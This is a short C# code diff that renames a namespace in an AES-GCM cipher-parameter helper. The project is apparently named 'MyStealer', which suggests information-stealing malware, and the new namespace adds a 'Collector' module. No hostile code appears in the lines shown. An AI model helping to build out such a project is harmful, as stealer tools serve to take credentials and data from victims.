@@ -3,7 +3,7 @@ using System;
 using System.Buffers;
 #endif
 
-namespace MyStealer.Utils.BcAesGcm
+namespace MyStealer.Collector.Utils.BcAesGcm
 {
     public class ParametersWithIV
         : ICipherParameters
